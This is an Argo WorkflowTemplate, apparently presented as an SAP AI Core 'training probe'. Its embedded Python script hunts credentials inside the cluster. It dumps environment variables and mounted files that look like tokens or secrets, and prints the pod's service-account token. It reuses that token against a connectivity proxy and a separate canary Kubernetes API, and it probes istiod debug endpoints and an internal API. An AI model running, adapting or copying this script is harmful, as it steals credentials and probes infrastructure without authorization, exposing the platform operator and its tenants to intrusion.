apiVersion: argoproj.io/v1alpha1
kind: WorkflowTemplate
metadata:
  name: probe-train-v6
  labels:
    scenarios.ai.sap.com/id: "bbprobe-global-1775842304"
    ai.sap.com/version: "1.0.0"
  annotations:
    scenarios.ai.sap.com/name: "bbprobe-global-1775842304"
    executables.ai.sap.com/name: "probe-train-v6"
    executables.ai.sap.com/description: "training probe v6 - connectivity token hunt, istiod debug, canary k8s api"
spec:
  templates:
  - name: probe
    container:
      image: python:3.11
      command: ["/bin/sh", "-c"]
      args:
      - |
        python3 - << 'EOF'
        import os, ssl, re, json, glob
        import urllib.request, urllib.error

        def report(k, v):
            print(f"[PT6] {k}: {str(v)[:12000]}", flush=True)

        def http_get(url, headers=None, timeout=10):
            try:
                req = urllib.request.Request(url, headers=headers or {})
                ctx = ssl.create_default_context()
                ctx.check_hostname = False
                ctx.verify_mode = ssl.CERT_NONE
                with urllib.request.urlopen(req, context=ctx, timeout=timeout) as r:
                    return r.read().decode(errors="replace"), r.status, dict(r.headers)
            except urllib.error.HTTPError as e:
                body = ""
                try: body = e.read().decode(errors="replace")[:4000]
                except: pass
                return f"HTTP_{e.code}:{body}", e.code, {}
            except Exception as e:
                return f"ERR:{type(e).__name__}:{e}", 0, {}

        report("START", "probe-train-v6")

        # ── 1. HUNT FOR CONNECTIVITY PROXY TOKEN ─────────────────────────────
        report("---", "=== 1. SAP-CP-Connectivity-Service-Token HUNT ===")

        # 1a. Environment variables
        cp_token_keys = []
        for k, v in os.environ.items():
            kl = k.lower()
            if any(x in kl for x in ["connectivity", "cp_token", "sap_cp", "proxy_token",
                                       "cloud_connector", "scc_", "on_prem"]):
                report(f"ENV_CP_{k}", v[:500])
                cp_token_keys.append(k)
        if not cp_token_keys:
            report("ENV_CP_SCAN", "no connectivity-related env vars found")

        # Also dump all env vars with "token", "secret", "key", "password" in name
        for k, v in os.environ.items():
            kl = k.lower()
            if any(x in kl for x in ["token", "secret", "password", "credential"]):
                report(f"ENV_SENSITIVE_{k}", v[:300])

        # 1b. Mounted secrets / files — search common paths
        search_paths = [
            "/var/run/secrets/",
            "/etc/istio/",
            "/etc/envoy/",
            "/var/run/secrets/kubernetes.io/serviceaccount/",
            "/etc/kubernetes/",
            "/run/secrets/",
            "/secrets/",
            "/config/",
        ]
        for base_path in search_paths:
            try:
                for root, dirs, files in os.walk(base_path):
                    for fname in files:
                        fpath = os.path.join(root, fname)
                        try:
                            with open(fpath, 'rb') as f:
                                content = f.read(4096)
                            # Check if it's text-ish
                            try:
                                text = content.decode('utf-8', errors='replace')
                                if any(x in text.lower() for x in
                                       ["connectivity", "token", "sap-cp", "cloud_connector",
                                        "on.prem", "bearer", "client_id", "client_secret"]):
                                    report(f"FILE_{fpath.replace('/','_')}", text[:1000])
                                elif len(text) < 2000 and not text.startswith('{'):
                                    # Small text files — dump them (might be tokens)
                                    if re.search(r'[A-Za-z0-9+/]{20,}={0,2}$', text.strip()):
                                        report(f"FILE_TOKEN_{fpath.replace('/','_')}", text[:500])
                            except: pass
                        except: pass
            except: pass

        # 1c. Try connectivity proxy port 20003 WITH our SA token as bearer
        report("---", "=== 1c. CONNECTIVITY PROXY WITH SA TOKEN ===")
        CP_HOST = "connectivity-proxy.connectivity-proxy.svc.cluster.local"
        sa_token = ""
        try:
            with open("/var/run/secrets/kubernetes.io/serviceaccount/token") as f:
                sa_token = f.read().strip()
            report("SA_TOKEN_EXISTS", f"len={len(sa_token)} first50={sa_token[:50]}")
        except Exception as e:
            report("SA_TOKEN", f"ERR:{e}")

        if sa_token:
            body, code, hdrs = http_get(
                f"http://{CP_HOST}:20003/",
                headers={"SAP-CP-Connectivity-Service-Token": sa_token,
                         "Authorization": f"Bearer {sa_token}"},
                timeout=8)
            report("CP_20003_WITH_SA_TOKEN", f"[{code}] {body[:800]}")

        # 1d. Try port 20001 with SA token as proxy auth
        body, code, hdrs = http_get(
            f"http://{CP_HOST}:20001/",
            headers={"SAP-CP-Connectivity-Service-Token": sa_token,
                     "Proxy-Authorization": f"Bearer {sa_token}"},
            timeout=8)
        report("CP_20001_WITH_SA_TOKEN", f"[{code}] {body[:800]}")

        # ── 2. ISTIOD DEBUG PORT 15014 ────────────────────────────────────────
        report("---", "=== 2. ISTIOD DEBUG PORT 15014 ===")
        for path in ["/debug/configz", "/debug/authorizationz", "/debug/endpointz",
                     "/debug/instancesz", "/debug/registryz", "/debug/syncz",
                     "/debug/resourcesz", "/debug/adsz", "/debug/ndsz",
                     "/metrics", "/ready", "/healthz", "/version",
                     "/debug/connections", "/debug/workloadz",
                     "/debug/push_status", "/debug/inject"]:
            body, code, _ = http_get(
                f"http://istiod.istio-system.svc:15014{path}", timeout=8)
            if code and "ERR:timed" not in body and "ERR:Connection" not in body:
                report(f"ISTIOD_15014{path.replace('/','_')}", f"[{code}] {body[:3000]}")

        # ── 3. CANARY K8S API WITH SERVICE ACCOUNT TOKEN ─────────────────────
        report("---", "=== 3. CANARY K8S API ===")
        CANARY_HOST = "api.intwdf-eu.mlfdev.internal.canary.k8s.ondemand.com"

        if sa_token:
            # Try our pod's SA token against the canary K8s API
            for path in ["/version", "/api/v1", "/api/v1/namespaces",
                         "/apis", "/openapi/v2",
                         "/api/v1/nodes", "/api/v1/pods"]:
                body, code, _ = http_get(
                    f"https://{CANARY_HOST}{path}",
                    headers={"Authorization": f"Bearer {sa_token}"},
                    timeout=10)
                if code and "ERR:timed" not in body and "ERR:Connection" not in body:
                    report(f"CANARY_K8S{path.replace('/','_')}", f"[{code}] {body[:2000]}")
        else:
            # Try without token
            for path in ["/version", "/openapi/v2"]:
                body, code, _ = http_get(f"https://{CANARY_HOST}{path}", timeout=10)
                if code and "ERR:timed" not in body and "ERR:Connection" not in body:
                    report(f"CANARY_K8S_ANON{path.replace('/','_')}", f"[{code}] {body[:500]}")

        # ── 4. NOT DIAMOND / GENAI-OPTIMIZATIONS API ─────────────────────────
        report("---", "=== 4. NOT DIAMOND API PATHS ===")
        ND_HOST = "genai-optimizations.ai.sec-eu10.eu-central-1.aws.ml.hana.ondemand.com"
        for path in ["/", "/v1/", "/api/", "/api/v1/",
                     "/health", "/healthz", "/ready", "/version",
                     "/v1/models", "/v1/router/models",
                     "/openapi.json", "/docs", "/metrics"]:
            body, code, _ = http_get(f"https://{ND_HOST}{path}", timeout=8)
            if code and "ERR:timed" not in body and "ERR:Connection" not in body:
                report(f"ND{path.replace('/','_')}", f"[{code}] {body[:1000]}")

        # ── 5. ISTIOD PORT 15010 (plaintext xDS / pilot discovery) ───────────
        report("---", "=== 5. ISTIOD PORT 15010 ===")
        for path in ["/debug/configz", "/debug/endpointz", "/debug/registryz",
                     "/metrics", "/ready", "/version"]:
            body, code, _ = http_get(
                f"http://istiod.istio-system.svc:15010{path}", timeout=8)
            if code and "ERR:timed" not in body and "ERR:Connection" not in body:
                report(f"ISTIOD_15010{path.replace('/','_')}", f"[{code}] {body[:2000]}")

        report("DONE", "probe-train-v6 complete")
        EOF
  entrypoint: probe
